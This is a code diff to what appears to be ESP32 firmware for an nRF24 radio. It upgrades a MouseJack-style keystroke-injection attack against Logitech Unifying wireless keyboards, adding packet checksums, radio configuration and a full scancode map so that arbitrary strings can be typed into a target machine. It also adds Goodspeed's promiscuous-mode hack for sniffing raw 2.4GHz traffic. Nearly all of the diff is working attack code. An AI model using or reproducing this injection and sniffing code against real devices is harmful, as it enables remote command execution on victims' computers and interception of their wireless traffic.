@@ -288,26 +288,43 @@ bool nrf24InjectKeystroke(uint8_t key, uint8_t modifiers) {
         return false;
     }
 
-    // Logitech keyboard packet format
+    // Logitech Unifying keyboard packet format (10 bytes)
+    // Ref: Bastille Research MouseJack, nRF24-Playset (Sysenter-EIP)
     uint8_t packet[10] = {0};
-    packet[0] = 0x00;      // Device type
-    packet[1] = 0xD3;      // Keystroke report
-    packet[2] = modifiers; // Modifier keys
+    packet[0] = 0x00;      // HID++ device index (keyboard = 0)
+    packet[1] = 0xC1;      // Frame type: keyboard report (was 0xD3 — WRONG)
+    packet[2] = modifiers;  // HID modifier byte
     packet[3] = 0x00;      // Reserved
-    packet[4] = key;       // Key code
+    packet[4] = key;       // HID usage code
     packet[5] = 0x00;      // Key 2
     packet[6] = 0x00;      // Key 3
     packet[7] = 0x00;      // Key 4
+    packet[8] = 0x00;      // Key 5
 
+    // Logitech LRC checksum: XOR of bytes 0-8
+    uint8_t lrc = 0;
+    for (int i = 0; i < 9; i++) lrc ^= packet[i];
+    packet[9] = lrc;
+
+    // Configure radio for Logitech Unifying injection
     nrf24Radio.stopListening();
+    nrf24Radio.setAutoAck(false);
+    nrf24Radio.setDataRate(RF24_2MBPS);
+    nrf24Radio.setCRCLength(RF24_CRC_16);   // Logitech requires 16-bit CRC
+    nrf24Radio.setPALevel(RF24_PA_MAX);
+    nrf24Radio.setPayloadSize(10);
     nrf24Radio.openWritingPipe(mouseJackerTarget);
 
     bool success = nrf24Radio.write(packet, 10);
 
-    // Send key release
+    // Send key release (bytes 2-8 = 0x00)
+    delay(5);
     packet[2] = 0x00;
     packet[4] = 0x00;
-    delay(10);
+    // Recalculate LRC for release packet
+    lrc = 0;
+    for (int i = 0; i < 9; i++) lrc ^= packet[i];
+    packet[9] = lrc;
     nrf24Radio.write(packet, 10);
 
     #if CYD_DEBUG
@@ -320,37 +337,231 @@ bool nrf24InjectKeystroke(uint8_t key, uint8_t modifiers) {
 }
 
 bool nrf24InjectString(const char* str) {
-    // HID keyboard scan codes for lowercase letters
-    static const uint8_t keyMap[] = {
-        0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,  // a-h
-        0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,  // i-p
-        0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B,  // q-x
-        0x1C, 0x1D                                        // y-z
-    };
-
+    // Full HID scancode map — covers a-z, A-Z, 0-9, symbols, special keys
+    // Ref: USB HID Usage Tables (Keyboard/Keypad Page 0x07)
     while (*str) {
         char c = *str++;
         uint8_t key = 0;
         uint8_t mod = 0;
 
         if (c >= 'a' && c <= 'z') {
-            key = keyMap[c - 'a'];
+            key = 0x04 + (c - 'a');         // a=0x04 .. z=0x1D
         } else if (c >= 'A' && c <= 'Z') {
-            key = keyMap[c - 'A'];
-            mod = 0x02;  // Left Shift
-        } else if (c == ' ') {
-            key = 0x2C;  // Space
-        } else if (c == '\n') {
-            key = 0x28;  // Enter
+            key = 0x04 + (c - 'A');
+            mod = 0x02;                      // Left Shift
+        } else if (c >= '1' && c <= '9') {
+            key = 0x1E + (c - '1');         // 1=0x1E .. 9=0x26
+        } else if (c == '0') {
+            key = 0x27;
+        } else {
+            // Symbols and special characters
+            switch (c) {
+                case ' ':  key = 0x2C; break;           // Space
+                case '\n': key = 0x28; break;           // Enter
+                case '\t': key = 0x2B; break;           // Tab
+                case '\b': key = 0x2A; break;           // Backspace
+                case '-':  key = 0x2D; break;
+                case '=':  key = 0x2E; break;
+                case '[':  key = 0x2F; break;
+                case ']':  key = 0x30; break;
+                case '\\': key = 0x31; break;
+                case ';':  key = 0x33; break;
+                case '\'': key = 0x34; break;
+                case '`':  key = 0x35; break;
+                case ',':  key = 0x36; break;
+                case '.':  key = 0x37; break;
+                case '/':  key = 0x38; break;
+                // Shifted symbols
+                case '!':  key = 0x1E; mod = 0x02; break;  // Shift+1
+                case '@':  key = 0x1F; mod = 0x02; break;  // Shift+2
+                case '#':  key = 0x20; mod = 0x02; break;  // Shift+3
+                case '$':  key = 0x21; mod = 0x02; break;  // Shift+4
+                case '%':  key = 0x22; mod = 0x02; break;  // Shift+5
+                case '^':  key = 0x23; mod = 0x02; break;  // Shift+6
+                case '&':  key = 0x24; mod = 0x02; break;  // Shift+7
+                case '*':  key = 0x25; mod = 0x02; break;  // Shift+8
+                case '(':  key = 0x26; mod = 0x02; break;  // Shift+9
+                case ')':  key = 0x27; mod = 0x02; break;  // Shift+0
+                case '_':  key = 0x2D; mod = 0x02; break;  // Shift+-
+                case '+':  key = 0x2E; mod = 0x02; break;  // Shift+=
+                case '{':  key = 0x2F; mod = 0x02; break;  // Shift+[
+                case '}':  key = 0x30; mod = 0x02; break;  // Shift+]
+                case '|':  key = 0x31; mod = 0x02; break;  // Shift+backslash
+                case ':':  key = 0x33; mod = 0x02; break;  // Shift+;
+                case '"':  key = 0x34; mod = 0x02; break;  // Shift+'
+                case '~':  key = 0x35; mod = 0x02; break;  // Shift+`
+                case '<':  key = 0x36; mod = 0x02; break;  // Shift+,
+                case '>':  key = 0x37; mod = 0x02; break;  // Shift+.
+                case '?':  key = 0x38; mod = 0x02; break;  // Shift+/
+                default:   continue;  // Skip unsupported chars
+            }
         }
 
         if (key) {
             nrf24InjectKeystroke(key, mod);
-            delay(20);
+            delay(10);  // 10ms between keystrokes for reliable injection
         }
     }
 
     return true;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PROMISCUOUS MODE (Travis Goodspeed technique)
+// Ref: "Promiscuity is the nRF24L01+" (2011), Keykeriki v2.0
+// Uses illegal 2-byte address width (SETUP_AW=0x00) to capture raw 2.4GHz
+// ═══════════════════════════════════════════════════════════════════════════
+
+// NRF24 register addresses for raw SPI access
+#define _PROMISC_CONFIG      0x00
+#define _PROMISC_EN_AA       0x01
+#define _PROMISC_EN_RXADDR   0x02
+#define _PROMISC_SETUP_AW    0x03
+#define _PROMISC_RF_CH       0x05
+#define _PROMISC_RF_SETUP    0x06
+#define _PROMISC_STATUS      0x07
+#define _PROMISC_RX_PW_P0    0x11
+#define _PROMISC_RX_PW_P1    0x12
+#define _PROMISC_RX_ADDR_P0  0x0A
+#define _PROMISC_RX_ADDR_P1  0x0B
+#define _PROMISC_FIFO_STATUS 0x17
+#define _PROMISC_FLUSH_RX    0xE2
+#define _PROMISC_R_RX_PAYLOAD 0x61
+
+static bool promiscActive = false;
+
+static void promiscWriteReg(uint8_t reg, uint8_t val) {
+    digitalWrite(NRF24_CSN, LOW);
+    SPI.transfer((reg & 0x1F) | 0x20);
+    SPI.transfer(val);
+    digitalWrite(NRF24_CSN, HIGH);
+}
+
+static uint8_t promiscReadReg(uint8_t reg) {
+    uint8_t val;
+    digitalWrite(NRF24_CSN, LOW);
+    SPI.transfer(reg & 0x1F);
+    val = SPI.transfer(0);
+    digitalWrite(NRF24_CSN, HIGH);
+    return val;
+}
+
+static void promiscWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
+    digitalWrite(NRF24_CSN, LOW);
+    SPI.transfer((reg & 0x1F) | 0x20);
+    for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
+    digitalWrite(NRF24_CSN, HIGH);
+}
+
+static void promiscFlushRx() {
+    digitalWrite(NRF24_CSN, LOW);
+    SPI.transfer(_PROMISC_FLUSH_RX);
+    digitalWrite(NRF24_CSN, HIGH);
+}
+
+bool nrf24SetPromiscuous() {
+    if (!nrf24Active) {
+        if (!nrf24Setup()) return false;
+    }
+
+    // Power down RF24 library's control — we go raw SPI from here
+    nrf24Radio.powerDown();
+
+    // CE LOW during config
+    digitalWrite(NRF24_CE, LOW);
+
+    // SETUP_AW = 0x00: illegal 2-byte address width (Goodspeed trick)
+    // RF24 library clamps minimum to 3 bytes — must bypass it
+    promiscWriteReg(_PROMISC_SETUP_AW, 0x00);
+
+    // Disable auto-ack on all pipes
+    promiscWriteReg(_PROMISC_EN_AA, 0x00);
+
+    // Enable RX on pipes 0 and 1
+    promiscWriteReg(_PROMISC_EN_RXADDR, 0x03);
+
+    // RF setup: 2Mbps, -6dBm (wider capture bandwidth, less noise than MAX)
+    promiscWriteReg(_PROMISC_RF_SETUP, 0x09);
+
+    // Set 2-byte RX addresses for preamble matching
+    // 0xAA preamble → after dewhitening gives 0x55,0x55 pattern
+    const uint8_t addr0[] = {0xAA, 0x55};
+    const uint8_t addr1[] = {0x55, 0xAA};
+    promiscWriteRegMulti(_PROMISC_RX_ADDR_P0, addr0, 2);
+    promiscWriteRegMulti(_PROMISC_RX_ADDR_P1, addr1, 2);
+
+    // Set payload width to 32 bytes (maximum)
+    promiscWriteReg(_PROMISC_RX_PW_P0, 32);
+    promiscWriteReg(_PROMISC_RX_PW_P1, 32);
+
+    // Flush RX FIFO
+    promiscFlushRx();
+
+    // Clear all IRQ flags
+    promiscWriteReg(_PROMISC_STATUS, 0x70);
+
+    // Power up in RX mode, CRC disabled
+    // CONFIG = PWR_UP | PRIM_RX = 0x03, no CRC bits
+    promiscWriteReg(_PROMISC_CONFIG, 0x03);
+    delayMicroseconds(1500);  // Tpd2stby
+
+    // CE HIGH to start receiving
+    digitalWrite(NRF24_CE, HIGH);
+    delayMicroseconds(130);
+
+    promiscActive = true;
+    currentNRF24Mode = NRF24_MODE_SNIFFER;
+
+    #if CYD_DEBUG
+    Serial.println("[NRF24] Promiscuous mode active (Goodspeed 2-byte AW)");
+    #endif
+
+    return true;
+}
+
+void nrf24ExitPromiscuous() {
+    if (!promiscActive) return;
+
+    // CE LOW, power down
+    digitalWrite(NRF24_CE, LOW);
+    promiscWriteReg(_PROMISC_CONFIG, 0x00);
+
+    promiscActive = false;
+    currentNRF24Mode = NRF24_MODE_OFF;
+
+    // Restore RF24 library control — re-init with normal settings
+    nrf24Radio.begin();
+    nrf24Radio.setPALevel(RF24_PA_MAX);
+    nrf24Radio.setDataRate(RF24_1MBPS);
+    nrf24Radio.setChannel(76);
+    nrf24Radio.setAutoAck(false);
+    nrf24Radio.disableCRC();
+
+    #if CYD_DEBUG
+    Serial.println("[NRF24] Promiscuous mode exited, RF24 library restored");
+    #endif
+}
+
+int nrf24ReadRawPacket(uint8_t* buf, uint8_t maxLen) {
+    if (!promiscActive) return 0;
+
+    // Check FIFO status
+    uint8_t fifoStatus = promiscReadReg(_PROMISC_FIFO_STATUS);
+    if (fifoStatus & 0x01) return 0;  // RX FIFO empty
+
+    // Read payload
+    uint8_t readLen = (maxLen < 32) ? maxLen : 32;
+    digitalWrite(NRF24_CSN, LOW);
+    SPI.transfer(_PROMISC_R_RX_PAYLOAD);
+    for (uint8_t i = 0; i < readLen; i++) {
+        buf[i] = SPI.transfer(0);
+    }
+    digitalWrite(NRF24_CSN, HIGH);
+
+    // Clear RX_DR flag
+    promiscWriteReg(_PROMISC_STATUS, 0x40);
+
+    return readLen;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
